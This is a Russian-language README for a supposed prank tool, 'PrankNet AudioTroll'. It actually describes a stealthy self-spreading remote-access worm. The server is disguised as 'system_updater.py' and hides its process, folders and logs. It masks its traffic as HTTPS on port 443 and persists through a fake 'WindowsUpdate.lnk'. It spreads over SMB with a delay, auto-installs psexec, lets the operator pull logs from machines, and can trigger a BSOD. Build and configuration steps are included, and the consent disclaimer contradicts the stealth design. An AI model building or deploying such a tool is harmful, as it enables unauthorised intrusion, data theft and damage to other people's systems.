# PrankNet AudioTroll 😈

![Version](https://img.shields.io/badge/Version-0.0.1b-blue.svg) ![Python](https://img.shields.io/badge/Python-3.6%2B-green.svg) ![License](https://img.shields.io/badge/License-MIT-lightgrey.svg)

**PrankNet AudioTroll** — шуточный проект для изучения сетей через розыгрыши! Загружай звуки, тролль локалку и следи за хаосом через логи — всё в стильном GUI! 🚀

> ⚠️ **Только для тестов и пранков с согласия друзей!** Используй в виртуалках, чтобы не словить неприятности.

---

## 📖 Описание проекта

PrankNet AudioTroll — это учебная программа для сетевых экспериментов:
- **Сервер** (`system_updater.py`) играет звуки и пишет логи.
- **Клиент** (`media_controller.py`) управляет всем через минималистичный интерфейс.

---

## ✨ Основные возможности

- 🎵 **Звуки**: Загружай и проигрывай .mp3/.wav на устройствах в сети.
- 📜 **Логи**: Скачивай лог-файлы для слежки за пранком.
- 🕵️‍♂️ **Скрытность**:
  - Логи в `C:\Temp\.syslog` или `/tmp/.syslog`.
  - Папки `.syscache` и `.update_tools`.
  - Процесс невидим, трафик под HTTPS (порт 443).
- 🌐 **Spread**: Распространение по SMB с задержкой 1-2 часа.
- ⚙️ **Автозагрузка**: `WindowsUpdate.lnk` (Windows) или `System Monitor` (Linux).
- 🎨 **GUI**: Темная тема, градиенты, кнопки с анимацией (сканирование, загрузка, воспроизведение, логи).
- 🔧 **Автоустановка**: `nmap`, `psexec` и библиотеки ставятся сами.
- 💥 **Критический режим**: Опционально (BSOD на Windows, только для тестов😼).

---

## 🛠 Требования

- 💻 **ОС**: Windows или Linux (macOS частично).
- 🐍 **Python**: 3.6+.
- 🌐 **Сеть**: Локалка (192.168.1.0/24).
- 📡 **Интернет**: Для загрузки `nmap`/`psexec` при первом запуске.
- 📚 **Библиотеки**: `customtkinter`, `pygame`, `python-nmap`, `pysmb`.

---

## 🔧 Установка

1. **Установи Python** 🐍:
   - Windows: [python.org](https://www.python.org/downloads/).
   - Linux: `sudo apt-get install python3`.

2. **Поставь библиотеки** 📦:
   ```bash
   pip install customtkinter pygame python-nmap pysmb
   ```

3. **Скачай проект** 📂:
   ```bash
   git clone https://github.com/z7x8c9/pranknet-audiotroll.git
   cd pranknet-audiotroll
   ```

4. **Запуск** 🚀:
   - Сервер (для звуков и логов):
     ```bash
     python system_updater.py
     ```
   - Клиент (для управления):
     ```bash
     python media_controller.py
     ```

5. **Компиляция в .exe** 🖥️ (для Windows):
   - Установи `PyInstaller`:
     ```bash
     pip install pyinstaller
     ```
   - Скомпилируй сервер:
     ```bash
     pyinstaller --onefile --icon=app.ico system_updater.py
     ```
   - Скомпилируй клиент:
     ```bash
     pyinstaller --onefile --icon=app.ico media_controller.py
     ```
   - Найди `.exe` в папке `dist/`. Иконку `app.ico` скачай (например, с [iconarchive.com](https://www.iconarchive.com)).

---

## 🎮 Использование

### Сервер (`system_updater.py`) 🖥️
- Запускается на машинах для звуков и логов.
- Что делает:
  - Слушает порт 443 (HTTPS-вид).
  - Сохраняет звуки в `.syscache`.
  - Пишет логи в `.syslog`.
  - Распространяется по сети (SMB).
- Всё скрыто: процесс, папки, логи.

### Клиент (`media_controller.py`) 🎨
1. Запусти — увидишь GUI с локальным IP и полем порта (дефолт 443).
2. Жми **"Сканировать сеть"** — выбери IP из списка.
3. Кнопки:
   - 🎵 **Выгрузить звук**: Загрузи .mp3/.wav.
   - ▶️ **Воспроизвести звук**: Укажи имя файла (например, `rickroll.mp3`).
   - 📜 **Получить лог-файл**: Скачай лог как `log_from_<IP>.txt` (открывается автоматом).

### Настройки ⚙️
- **Порт**:
  - В клиенте: Введи в поле порта.
  - В коде (`system_updater.py`, `media_controller.py`):
    ```python
    PORT = 443
    ```
- **Задержка Spread**:
  - В `system_updater.py`:
    ```python
    sleep(random.randint(3600, 7200))
    ```
- **Критический режим** :
  - В `system_updater.py`:
    ```python
    CRITICAL_PROCESS = True
    ```

---

## 🤝 Участие в проекте

Хочешь сделать этот проект еще лучше? Присоединяйся! 🌟
1. Форкни репо.
2. Создай ветку: `git checkout -b cool-feature`.
3. Коммить: `git commit -m "Добавил фичу"`.
4. Пул-реквест: `git push origin cool-feature`.

---
